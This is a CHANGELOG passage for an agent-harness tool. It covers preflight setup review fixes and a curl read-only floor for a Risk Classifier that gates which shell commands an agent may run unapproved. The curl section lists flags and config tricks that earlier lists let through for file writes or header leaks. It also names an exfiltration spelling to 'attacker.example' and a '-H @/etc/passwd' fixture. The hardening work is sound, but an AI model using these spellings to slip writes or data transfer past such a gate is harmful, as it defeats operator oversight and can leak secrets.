  - **Review round 2 finding (HIGH): on the very fixture this measurement cites, `--setup` SUPPRESSES the tag it exists to enable, unless the target repo gitignores its build output.** `packages/needs-build/dist/` (the build artifact `npm run build` writes) is not gitignored in agent-preflight's `tests/fixtures/monorepo-build-required` fixture. Re-measured 3 runs per cell, git-initialized copies of that fixture, `preflight run [--setup] --json .`, on the fixture as-is and on a variant with `node_modules/`, `dist/`, and `packages/*/dist/` added to `.gitignore`:
    - Fixture as-is, no `--setup`: `npm-test` -> `skip` (build-required), `clean-worktree` -> `pass`, overall `ready` -> `true`; ~0.46-0.51s wall time (3/3 runs).
    - Fixture as-is, `--setup`: `npm-test` -> `pass` (the build ran), but `clean-worktree` -> `fail` ("Repository has uncommitted changes", the new `dist/index.js` is untracked), overall `ready` -> **`false`**; ~0.65-0.72s wall time (3/3 runs). `runSessionStartPreflight` only writes the ledger fact on `ready === true`, so on this exact fixture `setup: true` makes the tag DISAPPEAR instead of appearing.
    - Gitignored variant (`node_modules/`, `dist/`, `packages/*/dist/` added), no `--setup`: `npm-test` -> `skip`, `clean-worktree` -> `pass`, overall `ready` -> `true`; ~0.46-0.52s wall time (3/3 runs), unchanged from the ungitignored case, as expected (nothing to gitignore yet without `--setup`).
    - Gitignored variant, `--setup`: `npm-test` -> `pass`, `clean-worktree` -> `pass` (the build artifact is gitignored, so it does not register as an uncommitted change), overall `ready` -> `true`; ~0.66-0.67s wall time (3/3 runs). This is the shape the knob is meant to produce.
    - Remedy, now stated in `docs/CLI.md`'s row and `src/schema/session-start-preflight.ts`'s header comment: `--setup` writes install/build output into the target repo's own worktree, and any such artifact the repo does not already gitignore flips agent-preflight's `clean-worktree` check and suppresses the tag entirely: gitignore the build/install output (e.g. `dist/`, `node_modules/`) in the target repo BEFORE enabling `session_start_preflight.setup`. A companion regression test now pins the ready:false-from-setup shape directly (see "Pinned by" below) so a future change to the not-ready branch cannot silently start writing the tag on that shape.
  - **Review round 2 finding (HIGH, security/docs): the trust and scoping surface was undocumented.** `docs/CLI.md`'s row and `src/schema/session-start-preflight.ts`'s header comment now mirror agent-preflight's own README trust wording (its `--setup` / `setup.enabled` section): under `--setup`, a `run:` line in the TARGET repo's own `.github/workflows/ci.yml` decides whether that repo's `build` script executes on the operator's machine, and `npm ci` runs that repo's own dependency lifecycle scripts; both are attacker-controlled repository content, so `setup: true` belongs only on repositories the operator already trusts to run. Both surfaces also now say the key is HOST-GLOBAL: it is read from the base manifest plus whatever machine-override layers apply (`src/cli/loader.ts`'s `resolvePaths`/`applyLayers`), and the generated `git-preflight` SessionStart hook invokes `harness session-start preflight` with no `--project` (`src/cli/init/templates.ts`), so one `setup: true` applies to every repo the operator opens a Claude Code session in from this host. This round's wording that "a project override layer turning it back off is the only scoping available today" was WRONG and is corrected in round 3 below. Neither the default (still `false`) nor per-repo scoping changed in this round.
  - **Review round 2 finding (MEDIUM, correctness/docs): the timeout budget and process-isolation mismatch was undocumented.** agent-preflight's own build step gets a SEPARATE, larger wall-clock budget on its side, `DEFAULT_SETUP_BUILD_TIMEOUT_MS` = 300000ms (agent-preflight's `src/checks/shared.ts`) plus its own `npm ci` step, against this companion's `DEFAULT_PREFLIGHT_TIMEOUT_MS` = 60000ms default `--timeout`. `execFile`'s `timeout` option kills only the `preflight` process itself, not a process group, so an in-flight `npm ci` / build can keep writing into the target repo's worktree after this hook has already exited 0 on a timeout. Recommendation, now stated next to the existing timeout-interplay text in both `docs/CLI.md` and this entry: raise `--timeout` here AND set a matching `setup.buildTimeoutMs` in the target repo's own `.preflight.json` together when enabling `setup` on a workspace whose install+build is slow. No process-group change in this round.
  - **Review round 3 fixes** (task `30183330`, the branch's round-3 commit). Rounds 1 and 2 each shipped documentation asserting behaviour the code does not provide, so this round traces every behavioural claim back to its code path and pins the scope claims with tests.
    - **HIGH (security/docs), corrected: the round-2 sentence "a project override layer setting `setup: false` back is the only scoping available today" was FALSE.** `resolvePaths` (`src/cli/loader.ts`) resolves a project override layer only when `LoaderOptions.project` is set; `--project <name>` is the only source of that value; and the generated `git-preflight` SessionStart hook (`src/cli/init/templates.ts`) invokes `harness session-start preflight` with no `--project`, so no project layer is ever consulted on the hook path. Hardcoding a `--project <name>` into that hook would not scope anything either, since the hook command is one static string and would name the same single project for every repository. `docs/CLI.md` and `src/schema/session-start-preflight.ts` now state the truth instead: NO per-repo scoping exists today, the key is a host-wide on/off resolved from the base manifest plus whatever machine-override layers apply, and making the producer derive a project name from its own cwd would be the follow-up that turns it into a per-repo knob. Both halves of that claim are now pinned by tests (see "Pinned by, review round 3" below), and the machine-override layer, which IS the real scoping surface, is driven end to end by a producer test. **Superseded in this release by task `c88461c1` (see above): the producer now DOES derive a project name from its own cwd, so this "NO per-repo scoping exists today" claim describes the pre-`c88461c1` state only.**
    - **MEDIUM (tests): the round-2 "ready:false from `--setup`" regression test never drove the feature.** It set no `session_start_preflight.setup` at all, so it exercised the plain not-ready branch and no `--setup` mutant could kill it. It is replaced by two tests that do drive it: one asserts inside the injected runner that `setup === true` arrived before returning the clean-worktree failure, and one spawns a fake `preflight` binary on `PATH` that emits the degraded `ready:false` payload ONLY when `--setup` is in its own argv, so the whole chain (manifest key, `setupEnabled`, `buildPreflightArgv`, the `execFile` argv) is load-bearing for the assertion.
    - **MEDIUM (maintainability): the ledger-writer's own `loadManifest(opts)` call no longer reads `opts.manifest`.** Round 1 had widened it to `opts.manifest ?? loadManifest(opts).manifest`, which nothing in this change needs and which contradicted the `manifest` option's own documented scope. It is back to the plain `loadManifest(opts).manifest`, and the option's JSDoc plus the comment at that call site now describe exactly that: the injected manifest reaches the `setupEnabled` resolution and nothing else, so it can never suppress the ledger writer's run-aborting load failure.
    - **Documentation placement.** `docs/CLI.md`'s table cell is now a one-line pointer plus the security sentence; the HOST-WIDE, SECURITY, KNOWN DEGRADATION and TIMEOUT INTERPLAY detail moved into a Notes subsection under the table, following the pattern the file already uses for toolchain-parity. The agent-preflight fixture path behind the degradation measurement is cited here in the CHANGELOG only, not in the user-facing doc. The Notes also carry the version caveat: the conditional build step exists only on the UNRELEASED agent-preflight build, `--setup` on the published `@lannguyensi/agent-preflight@0.5.0` is dependency-install only, and the `git-preflight` hook template's `min_version` therefore stays `0.2.0` until the agent-preflight release that ships the build step. **Superseded in this release by task `c88461c1` (see above): the Notes subsection's HOST-WIDE label now describes the PER-REPO SCOPING bullet's precedence baseline (base manifest + machine layers), not the absence of a project layer.**
    - Both commander descriptions (`harness preflight` and `harness session-start preflight`, `src/cli/index.ts`) now name the opt-in key, say it is default off, and point at `docs/CLI.md` for the trust and scope caveats.
  - Pinned by, review round 3: `tests/cli/init-preflight-hook-project-scope.test.ts` (the rendered `git-preflight` hook command carries no `--project`, checked on `FULL_TEMPLATE` and across every template `harness init` can write); `tests/cli/loader-project-layer.test.ts` (`resolvePaths` returns `projectLayer: null` without `opts.project` even with a project layer on disk, and `loadManifest` keeps the base manifest's `setup: true` rather than the layer's `setup: false`; both invert when `project` is passed, so the mechanism is pinned as present-but-unreachable-on-the-hook-path rather than absent); `tests/cli/session-start/preflight.test.ts` (the machine-override layer flipping `setup` back off end to end through the producer, and the two rewritten `ready:false from --setup` tests described above); and `tests/cli/explain-policy.test.ts` (name-prefix boundary: a custom policy that consumes `preflight:` evidence but is not named `preflight-before-*` gets no `session_start_preflight` field, while a bare `preflight-before-` prefixed policy does).
  - Pinned by `tests/cli/session-start/preflight.test.ts` (`buildPreflightArgv`'s argv-pinning tests with and without `setup`, the `SessionStartPreflightSchema` manifest-parsing tests (default off, `.strict()` unknown-key rejection, wrong-type rejection), the manifest-wiring tests proving `setup` flows from an injected manifest through to the `runPreflight` call, the "degrades to false rather than aborting the whole run" test for a manifest load failure, the HEAD-binding order regression test, a new test asserting a `ready:false` result whose `clean-worktree` check failed leaves the ledger tag unwritten and surfaces the failing check in the reason/log the same way every other not-ready result does, a new test proving `setup: true` reaches `runPreflight` via the REAL `loadManifest` path off a temp `configPath` manifest (not only the injected-`manifest` seam), and a new test pinning that the real `spawnPreflight` execFile call receives `buildPreflightArgv(cwd, setup)`'s argv for both `setup` states against a fake `preflight` binary on `PATH`) and `tests/cli/explain-policy.test.ts` (the new `session_start_preflight` field: shown false by default, true when enabled, absent for a non-`preflight-before-*` policy).
  - **Review round 3 residual fixes** (task `c88461c1`, tracker `1c4eb3ea`, batch-44 follow-up). Round 3 closed `accept_with_notes` with four LOWs drafted as follow-ups plus one gap named only in review: a derived layer that fails to load produced no diagnostic anywhere. This entry closes all five.
    - **Scoped-load failure now degrades to `setup: false`, not the plain load's value, in both `explain-policy` and `doctor`.** A round-3 comment claimed the two already matched the producer's own `setupEnabled` catch; they did not; both kept the PLAIN load's `setup` value on a scoped-load throw. `explain-policy` now reports a new `source: "unresolvable"` value alongside `setup: false` (not `"base"`, which would misattribute the result to a layer it never actually re-read on this path); `doctor` goes silent (no finding), the same as a genuinely off `setup`. Pinned by a malformed-project-layer test in each of `tests/cli/explain-policy.test.ts` and `tests/cli/doctor-session-start-preflight-setup-version.test.ts`. Superseded by the "Review round 1 fixes" entry below: `doctor` no longer goes silent here, it reports a new `kind: "layer_unresolvable"` warning instead.
    - **The producer's own `setupEnabled` catch now names the failed layer path on stderr.** Previously silent: nothing anywhere said WHY a scoped-load failure degraded to `setup: false`, or which layer failed. `src/cli/session-start/index.ts` now emits one line via the existing `note()` helper naming the project layer path and the underlying error (best-effort; only when the layer path itself is resolvable, and only for a real `loadManifest` failure, not an injected `opts.manifest`). Pinned by a new test in `tests/cli/session-start/preflight.test.ts`.
    - **`isValidProjectName` (`src/runtime/git-context.ts`) is exported and applied at `resolvePaths`' own `path.join` sink** (`src/cli/loader.ts`), defense in depth: `deriveProjectName` already validated the name at every one of its own exits, but `resolvePaths` had no equivalent guard for an `opts.project` reaching it from anywhere else. An invalid name (`".."`, a name containing a path separator, etc.) now resolves `projectLayer: null`, the same as "no layer on disk", instead of being joined unvalidated. Pinned by new tests in `tests/cli/loader-project-layer.test.ts` (a `".."` `opts.project` resolves no layer even when a file sits one level up, and `loadManifest` keeps the base value; a valid name is unaffected).
    - **`doctor`'s `sessionStartPreflightSetupVersion` finding now carries the cwd-derived project name.** Previously the report's own top-level `project` field reflected only an EXPLICIT `--project` (`opts.project ?? null`), so a `setup: true` verdict decided by a per-repo project layer looked identical to one decided by the base/machine value. `checkSessionStartPreflightSetupVersion` (`src/cli/doctor/session-start-preflight-setup-version.ts`) gains an OPTIONAL third `projectName` argument, carried onto the finding as `projectName` (omitted, not merely `undefined`, when the caller does not pass it, so this pure function's own pre-existing unit tests are unchanged); `doctor()` always passes the same name it derives for its own scoped load, and `format.ts` renders it as a `(project: X)` suffix on the warning line. `docs/CLI.md`'s VERSION CAVEAT paragraph names the new field. Pinned by new tests in `tests/cli/doctor-session-start-preflight-setup-version.test.ts` (three pre-existing end-to-end assertions also gained a `projectName` expectation, since `doctor()` now always passes one). Superseded by the "Review round 1 fixes" entry below: `doctor()` no longer always passes this name, only when the scoped load actually RESOLVED a project layer file.
    - **`explain-policy`'s scoped SECOND load now runs only for a `preflight-before-*` policy**, moved behind the same name-prefix check that already gates whether the resulting block is even rendered (previously it ran unconditionally, before the policy was even looked up, so explaining any OTHER policy paid for a manifest load whose result it could never see). Pinned by a call-counting spy test in `tests/cli/explain-policy.test.ts` (`vi.mock` + `importOriginal` over `loadManifest`, the ESM-named-export idiom `tests/cli/manifest-view-parity.test.ts` already uses).
    - **A checkout reached through a symlink now derives the REAL directory's name, matching decision D-021a's "repository identity is the common dir" rule.** `deriveProjectName` (`src/runtime/git-context.ts`) resolves the common dir through `fs.realpathSync` before taking its basename (best-effort: a dangling symlink or unreadable target falls back to the un-resolved value, never throws). Pinned by a new symlinked-checkout test and a realpath-failure-fallback test in `tests/runtime/git-context.test.ts`.
    - **`layerDeclaresSetup`'s WHOLE-BLOCK tombstone branch (`session_start_preflight: null`, distinct from the per-key `{setup: null}` form) is now tested.** Pinned by a new test in `tests/cli/explain-policy.test.ts`.

  - **Review round 1 fixes** (task `1c4eb3ea`, round 2 of the batch-44 follow-up; three MEDIUMs, five LOWs). Round 1's own review found: the `(project: X)` suffix docs/CLI.md claimed distinguished a layer-decided warning from a base/machine-decided one was FALSE, `projectName` carried the ATTEMPTED derivation, present for every cwd inside a git work tree, layer or no layer; the `format.ts` rendering of that suffix was untested (a probe forcing the condition to `false` survived); a derived layer that fails to load still produced NO diagnostic in `doctor`'s own report, only the producer's stderr line; the producer's diagnostic could misattribute a base- or machine-layer parse failure to a perfectly fine project layer; the "one line" diagnostic claim was false against a genuinely multi-line YAML error; about a dozen bare `D-006` code-comment citations collided with a DIFFERENT, unrelated `D-006` decision from the batch-43 run; `docs/okf/log.md` got no entry, leaving its newest entry describing the behavior this round REVERSES as current; and the SINK GUARD docs sentence read as broader defense-in-depth than `isValidProjectName` actually provides. This entry closes all eight.
    - **`doctor`'s `sessionStartPreflightProjectName` (and the finding's `projectName`) is now set only when the scoped load actually RESOLVED a project layer file**, not merely whenever a name was derivable for the cwd (`resolvePaths(...).projectLayer !== null`, the same signal the producer's own diagnostic already used to decide whether to emit its stderr line). `docs/CLI.md`'s VERSION CAVEAT paragraph rewritten to say so. Pinned by a new end-to-end `doctor()` test asserting `projectName: null` (and no `(project: X)` suffix in `format()`'s output) when a name was attempted but no layer exists on disk, alongside the pre-existing positive case.
    - **`format.ts`'s `(project: X)` suffix rendering is now asserted end to end**, both the positive case above and the negative control; a probe forcing the suffix condition to `false` (the round-1 reviewer's survivor) is now killed.
    - **`doctor` reports a new `kind: "layer_unresolvable"` warning instead of going silent when a project layer FILE exists but fails to load.** `SessionStartPreflightSetupVersionFinding` gains this kind (`actualVersion: null`, `projectName` set, `message` naming the layer path and the parse error's FIRST LINE), counted in `warningCount`, rendered by `format.ts` as one warning line, built directly by `doctor()` since `checkSessionStartPreflightSetupVersion` never produces ANY finding once `setup` has degraded to `false`. A scoped-load failure with no project layer on disk for the attempted name (the throw came from the base/machine layers) still stays silent, unchanged: `doctor()`'s own PLAIN top-level `loadManifest(opts)` call already surfaces a genuine base/machine parse failure by throwing before this point is reached. `docs/CLI.md`'s "goes silent" sentence rewritten. Pinned by the pre-existing malformed-project-layer `doctor` test, now asserting the new finding shape and a `format()` assertion instead of `toBeUndefined()`.
    - **The producer's own diagnostic no longer blames "the project layer" for a base- or machine-layer parse failure.** The lead-in now describes the SCOPED LOAD itself failing (`the project-scoped manifest load for project <name> failed`), with the layer path kept only as context, never as the claimed culprit; the underlying (possibly multi-line) YAML parse error is collapsed to its FIRST LINE in both this diagnostic and the new `doctor` finding above, so the "one line" claim actually holds for a genuinely multi-line error. Pinned by a new machine-layer-failure test in `tests/cli/session-start/preflight.test.ts` (a VALID project layer, a malformed machine layer, asserting the message never claims the project layer failed) and a one-line assertion added to the pre-existing malformed-project-layer test.
    - **About a dozen bare `D-006` code-comment citations (in `src/cli/loader.ts`, `src/cli/doctor/{index,format,session-start-preflight-setup-version}.ts`, `src/cli/explain-policy.ts`, `src/cli/session-start/index.ts`, `src/runtime/git-context.ts`, and `docs/CLI.md`) replaced by the tracker id `1c4eb3ea`.** They all cited THIS run's own D-006 pre-decision (`.ai/runs/2026-09-08-open-pool-batch44/03-decisions.md`, about this task's item 5), but a bare `D-006` collides with an UNRELATED D-006 decision from the batch-43 run; the batch-43 citations (`D-021a`, `D-021b`, `D-028`) are left exactly as they were, since those remain unambiguous.
    - **`docs/CLI.md`'s and `src/runtime/git-context.ts`'s SINK GUARD sentences narrowed to name `resolvePaths` as the ONE guarded sink.** `isValidProjectName` does not guard `substituteProject` (`src/probes/memory.ts:62`) or `generate-memory-index.ts`'s own `{project}` substitution (`src/cli/apply/generate-memory-index.ts:71`), both of which still interpolate an operator-supplied `--project` value into a path unvalidated (reachable only via the explicit `--project` flag, never this module's cwd-derived value, so the exposure is narrow); guarding or explicitly accepting those two sinks is a follow-up, out of this task's scope. **Superseded by task `e904f25a`** below for `substituteProject` specifically: once `buildLockEntries` (`src/io/harness-lock.ts:289-291`, fed from `opts.project` in `src/cli/apply/apply.ts`) was found to interpolate the same placeholder unguarded and un-reserved, THREE `{project}` sinks (`substituteProject`, `generate-memory-index.ts`, `buildLockEntries`) were unguarded as of task `1c4eb3ea`'s own release; task `e904f25a` guards `substituteProject`, so TWO remain unguarded now (`generate-memory-index.ts`, Codex-reserved; `buildLockEntries`, a follow-up). The stale `src/probes/memory.ts:62` line reference above is superseded along with the claim it supported.
    - **`docs/okf/log.md` gains a top entry** recording this round's reversal to `setup: false`, the new `unresolvable`/`layer_unresolvable` values, the narrowed `projectName`/sink-guard docs, and the re-anchored/re-stamped bundle docs (see the entry itself).

  - **Review round 2 fixes** (task `1c4eb3ea`, round 3 of the batch-44 follow-up; two MEDIUMs, five LOWs, one missing-test finding). Merged `origin/master` (task `65952a0c`) first; see `docs/okf/log.md`'s top entry for the conflict-by-conflict resolution. Round 2's own review found: `docs/CLI.md`'s VERSION CAVEAT claimed the `layer_unresolvable` degrade affects "the manifest every OTHER check in this report reads," which is false (it degrades only the LOCAL copy this one check judges, unconsumed on this path at all); two `CHANGELOG.md` round-1 sub-bullets described behaviour in the present tense that round 2 had already reversed; the `KNOWN UNREACHABLE TODAY` code comment labeled the whole scoped-load catch when only one sub-path and one assignment are actually unreachable/unobservable; the `layer_unresolvable`-counted-in-`warningCount` claim was pinned only with `toBeGreaterThanOrEqual(1)`, satisfiable by unrelated environment warnings; the fourteen remaining bare `D-006` citations the round-1 fix missed all lived in test files, not the src files that fix covered; `docs/CLI.md` did not say what `--project` against a malformed layer actually does (a hard fail at the plain load, never `layer_unresolvable`); `docs/CLI.md` said `projectName` is "absent," when every doctor finding actually carries `projectName: null`; and the machine-layer-failure test pinned only the negative half of its own claim. This entry closes all eight (docs fixes 1, 2, 6, 7 below; the code-comment fix 3; the test fixes 4, 8; the fourteen-occurrence sweep 5).
    - **`docs/CLI.md`'s VERSION CAVEAT corrected: the `layer_unresolvable` degrade is a LOCAL copy, unconsumed on this path.** The degraded manifest built in `doctor()`'s scoped-load catch is fed only to `checkSessionStartPreflightSetupVersion`; on the `layer_unresolvable` path it is never even read, since the check reports the load failure itself instead of any setup verdict; every OTHER doctor check reads the untouched plain base/machine manifest, unaffected.
    - **Two round-1 `CHANGELOG.md` sub-bullets ("doctor goes silent" and "`doctor()` always passes the same name") now carry a superseded-by clause** pointing at the round-1-fixes sub-bullets above that reverse both.
    - **`src/cli/doctor/index.ts`'s scoped-load catch comment narrowed to what is actually unreachable/unobservable.** The catch itself IS reached in every shipped run with a malformed project layer; only the `unresolvableLayerPath === null` sub-path is unreachable today, and only the manifest-degrade assignment right below the comment is unobservable (its value is always discarded by the `??` that prefers `sessionStartPreflightLayerUnresolvable`, in every real invocation).
    - **`warningCount`'s `layer_unresolvable` contribution is now pinned by a delta, not a floor.** A new test runs the same fixture once with and once without the malformed project layer (`setup: false` at the base in both, so no other setup-related finding can fire) and asserts the two `warningCount`s differ by exactly one.
    - **The fourteen bare `D-006` citations left in five test files (`tests/runtime/git-context.test.ts`, `tests/cli/loader-project-layer.test.ts`, `tests/cli/explain-policy.test.ts`, `tests/cli/doctor-session-start-preflight-setup-version.test.ts`, `tests/cli/session-start/preflight.test.ts`, including four user-visible `describe()` titles) replaced by the tracker id `1c4eb3ea`.** The round-1 fix's lead-in named only `src` files and `docs/CLI.md`, which it did cover completely; these test-file occurrences were a separate, missed set, not an overclaim in that entry.
    - **`docs/CLI.md` now says what an explicit `--project` against a malformed project layer for that name does: hard-fails at doctor's plain top-level `loadManifest(opts)`, never `layer_unresolvable`.** That kind covers only the cwd-derived path; the explicit-flag path was previously undocumented and read as if it produced the same warning.
    - **`docs/CLI.md`'s `projectName` description corrected from "absent" to `null`.** Every doctor-produced finding carries `projectName: null` on the base/machine-decided path (the field is only OMITTED, not `null`, for a direct unit-test call to `checkSessionStartPreflightSetupVersion` that never passes the argument at all); the separate sentence about those direct callers is unchanged.
    - **The machine-layer-failure test in `tests/cli/session-start/preflight.test.ts` now also pins the positive half of its own claim**: the failing MACHINE layer's own path appears in the producer's diagnostic (`readYamlFile`'s error embeds the path it failed to parse, carried through verbatim), not just that the fine project layer's path is not blamed.

- **`harness doctor` warns when `session_start_preflight.setup` runs against a `preflight` binary below the build-capable release** (task `6993d9b5`). `--setup`'s conditional build step (see the `30183330` entry above) shipped in `@lannguyensi/agent-preflight@0.6.0` (tag `v0.6.0`, merge commit `2062831`); on `0.5.0`, `--setup` was dependency-install only, so an operator who enabled the knob against that release paid `npm ci` time and the `--setup` trust exposure (`docs/CLI.md`'s SECURITY note) for zero build benefit, with nothing telling them so. The new check (`src/cli/doctor/session-start-preflight-setup-version.ts`) fires only when `session_start_preflight.setup: true` is set, probing the `preflight` binary on `PATH` (`preflight --version`, the same command the `git-preflight` hook template already probes) and comparing it against a hardcoded `0.6.0` floor, INDEPENDENT of the manifest's own `git-preflight` hook `min_version` (below): an existing, previously generated manifest still carries the old `0.2.0` floor until re-applied, so relying on the generic `hooks[]` version check alone would miss exactly the operators this warning targets. Silent when `setup` is off/absent, or when the installed version already meets `0.6.0`; a probe that fails to run or fails to parse a version still warns (fail-loud, not silent), naming the reason. Both this check's floor and the template bump below read one exported constant, `SESSION_START_PREFLIGHT_SETUP_BUILD_MIN_VERSION` (`src/schema/session-start-preflight.ts`), pinned by a test asserting the constant's value so the two cannot drift apart. Superseded by task `65952a0c` (entry above): the shared constant was split into two independent constants, and the value-equality pin was replaced by source-identity pins that discriminate a swap between them.
  - Pinned by `tests/cli/doctor-session-start-preflight-setup-version.test.ts`: the constant pin; silent with `setup` absent/false even against an ancient probed version; warns naming both the installed and required version when `setup: true` and the probe returns `0.5.0`; silent at exactly `0.6.0` and above it (`0.7.1`); `probe_failed`/`parse_failed` warn (not silent) on a probe returning nothing or unparseable output; and end-to-end `doctor()`/`format()` coverage with a fake `preflight` binary on `PATH` for both the warning and the silent cases.
  - Mutation probe: dropping the `compareNumericVersions(actual, required) < 0` comparison (always treating the probed bin as sufficient) makes the "warns naming both versions when setup is true and preflight is below the floor" test fail, since the finding this test asserts is never produced.

- **`git-preflight` hook template `min_version` raised `0.2.0` -> `0.6.0`** (task `6993d9b5`, second commit, gated on the agent-preflight `0.6.0` release above). A freshly generated manifest (`harness init` on `FULL_TEMPLATE`; `harness apply` only projects an already-written manifest OUT to `settings.json`, it never generates `harness.yaml`) now floors the `git-preflight` hook's OWN generic `hooks[]` version check (`checkHookVersion`, unrelated to the doctor check above) at `0.6.0` instead of `0.2.0`, so a stale preflight install is flagged on `harness doctor` even for an operator who never sets `session_start_preflight.setup` at all. Existing, previously generated manifests keep their own on-disk `min_version` until regenerated; this bump only changes what a NEW `harness init` writes. The wizard's own `preflight` dependency floor (`src/cli/init/dependencies.ts`, shown in the `harness init` dependency table) now shares the same `SESSION_START_PREFLIGHT_SETUP_BUILD_MIN_VERSION` constant, so the table never advertises `0.2.0+` while the manifest it writes declares `0.6.0`.
  - Pinned by `tests/cli/init-full-template-pins.test.ts` ("git-preflight (agent-preflight) floors at 0.6.0..."), updated from the prior `0.2.0` assertion.

### Fixed

- **`tests/runtime/hermetic-spawn-allowlist.test.ts`'s three cwd-sensitive D3/F5/F6 probes now skip instead of false-failing inside any checkout whose own root sits under the OS temp directory** (task `9a4a417b`). Those probes need a fixture location outside the D3 `os.tmpdir()` exemption to prove a real, non-exempt spawn is still caught; `agent-primitives probe`'s default isolation copy is the common way to hit this, since it lives under the OS temp directory itself, so a fixture created under the copy's own `process.cwd()` fell under that same exemption and the assertions could never fire there; a Linux `git worktree add /tmp/...` or a CI checkout under `$TMPDIR` skip these three tests under a plain `npm test` the same way. Pass `-l/--log-dir` pointing outside the OS temp directory (or `-i inplace`) to `agent-primitives probe` to keep them running there too. The three probes now detect the missing precondition with the exact `isUnderTmp` helper the guard itself uses and skip, with a named reason, only when it is unmet; unchanged in the real checkout and in a plain `git worktree add --detach` copy, where all tests in the file still run exactly as before. Round 2 (same task): the skip predicate is now pinned by an always-running assertion so a mutant hardcoding it cannot survive; F5/F6a/F6b each also get a location-independent companion assertion that calls the fixed resolver directly (no spawn, so the `os.tmpdir()` exemption never applies to it) and keeps their coverage everywhere, including inside the default isolation copy; the F5 test title's em dash was changed to a colon to match this repo's no-em-dash convention.
...
- **A curl read-only SHAPE floor for the Risk Classifier** (task `fdaad781`, decision D-026), reintroducing a `low`-severity `curl` recognition after decision D-013 (task `2929c5b7`) removed one entirely, following a per-flag DENYLIST and then a per-flag ALLOWLIST that each leaked (round 2 missed `-o`; round 3 admitted `-w`/`--write-out`, whose format string writes a local file via curl 8.3.0's `%output{FILE}` directive). Both leaks shared one root cause: a per-flag list is only as correct as the last reasoner's enumeration of every flag's write capability across every curl version. This floor inverts the burden instead: it recognizes ONE narrow invocation SHAPE and forfeits (stays unclassified) on every other spelling, so a flag nobody has reasoned about here can only widen the unclassified, approval-gated set; it can never slip into `low` by omission.
  - `isReadOnlyCurlCommand` (`src/runtime/read-only-bash.ts`), wired ONLY into `src/runtime/risk-classifier.ts` next to the sed and kubectl floors, below the built-in destructive floor. `isReadOnlyBashCommand`'s own body (and `isReadOnlyBashPipeline`'s, and `isReadOnlySedCommand`'s, and `isReadOnlyKubectlCommand`'s) is untouched -- round 2 later added a `\r` clause to their SHARED `hasUnsafeShellMetachar` preamble (see round-2 note below), which makes all four strictly more restrictive for a bare carriage return, not byte-identical to before that clause landed; observable through `isReadOnlyBashCommand`'s two consumers, the understanding-gate PreToolUse blocker and the solution-acceptance write-guard.
  - **Round 2 (adversarial review of round 1's own shipment) hardened the shape before this entry ever left `[Unreleased]`**, measured against curl 8.7.1: a bare `curl -s '<url>'` (round 1's own positive fixture) writes an operator-invisible file through `~/.curlrc`'s `output` directive, closed by making `-q`/`--disable` a MANDATORY second word (curl only honors it as the first argument); `-L`/`--location` forwards a custom `-H` header across a redirect to a different host over plaintext http, dropped from the closed flag set; `-k`/`--insecure` (a deliberate TLS-verification bypass) dropped from the closed flag set too; a bare `\r` (no paired `\n`) in a `-H` value reaches curl's wire unmodified, refused by adding `\r` to the shared whole-command metachar guard (`hasUnsafeShellMetachar`) and to the header-value check; `CURL_SHAPE_URL_RE` excluded `?`/`*`, forfeiting the most common read-only spelling (a URL with a query string), both now admitted (curl's own globbing uses only `{}`/`[]`, and the operand stays single-quoted so the shell cannot glob either way); `splitCurlWords`' separator class narrowed from JS `\s` (a superset of bash's default IFS) to space/tab only.
  - Allowed shape (as shipped in round 2; revised twice since and narrowed in round 4, see rounds 3 and 4 below): head exactly `curl` (no path prefix, no `env`/`command`/`sudo` wrapper); mandatory `-q`/`--disable` as the very next word; exactly one operand, a single-quoted `https://` URL excluding a single quote, whitespace, `{`, `}`, `[`, `]`, backslash, backtick, and `$` (but NOT `?`/`*`), `http://`, or userinfo; flags only from `-s`/`-S`/`-f`/`-I` (any cluster combination), `--silent`/`--show-error`/`--fail`/`--head`, and `-H`/`--header` or `-m`/`--max-time`/`--connect-timeout` in separate-token form only (quoted header value, no `@` prefix once leading whitespace is trimmed (round 4), no `$`/backtick (a newline or carriage return anywhere in the command is refused by the shared whole-command guard, see round 3); bare-integer timeout), never glued, never `=`-joined, never repeated. Any chaining, redirection, substitution, carriage return, unknown flag, or second operand forfeits the whole command.
  - **A splitter built only for this floor.** `splitCurlWords` is quote-aware, unlike every other floor in this file, which treats `trimmed.split(/\s+/)` as the tokenizer: a quoted value containing a space (`-H 'Accept: application/json'`) must parse as one token, which the naive split cannot do.
  - Residuals (see docs/risk-gate.md for the full list): URL- and header-only exfiltration to the named `https` host is still authorized (`curl -q -s 'https://attacker.example/collect'` floors `low`; no flag analysis decides whether a URL is trustworthy); proxy environment variables (`http_proxy`, `ALL_PROXY`, ...) and `CURL_CA_BUNDLE` sit entirely outside argv, so this shape cannot see them; the closed flag list is proven inert only against curl 8.7.1, the version measured throughout; `--libcurl`/`--alt-svc`/`--hsts` each write a local file and are named by neither this floor nor the destructive floor's write-flag scan, so they stay unclassified (approval-gated) by omission, the intended fail-safe; a MULTI-parameter query string joined by `&` also forfeits, even single-quoted -- the shared whole-command metachar guard rejects a bare `&` with no quote awareness at all, so round 2's `?`/`*` admission closes only the single-parameter query-string spelling, not the more common multi-parameter one, and closing this residual would require making that shared guard quote-aware, deliberately left out of scope.
  - **Tests** (`tests/runtime/read-only-floors.test.ts`): positive fixtures for every allowed spelling in the shape (now `-q`-qualified, including a query string with `?`); negative fixtures split by exact outcome (genuinely unclassified vs. raised to `high` by the destructive floor instead of floored `low`), each isolating exactly one forbidden spelling against an otherwise-valid `curl -q -s '<url>'` base; a dedicated fixture for a literal CR in a header value; the unchanged residual; the pre-existing generic `--help`/`--version` shape; and pins that `isReadOnlyBashCommand` still never accepts curl. Mutation probes (each applied, run, and reverted): admitting `o` into the no-value short-flag cluster set turns the `-so` (lowercase, glued, no separate operand) negative red; removing `isAllowedCurlFlagValue`'s `@`-prefix check turns the two QUOTED `@`-value negatives red (`-H '@/etc/passwd'` and `--header '@-'`) -- the pre-existing unquoted `-H @f` fixture never reaches that check at all, since an unquoted value forfeits one line earlier; admitting `$` into `CURL_SHAPE_URL_RE`'s path class turns the single-quoted-`$` negative red; removing the mandatory `-q`/`--disable` check turns a dedicated `curl -s '<url>'` (no `-q`) negative red; re-admitting `-L` into the closed flag set turns the `-L` negative red. (Round 1's CHANGELOG entry here previously claimed a mutation probe on `-o` as the discriminating case; that claim did not reproduce on inspection -- `-o`'s value check already rejects a non-numeric value like `f` on the ORIGINAL code, independently of whether `-o` is on the value-taking-flag list, so admitting `-o` alone does not turn that fixture red. Replaced with the `-so` cluster probe above, which is verified to discriminate.)
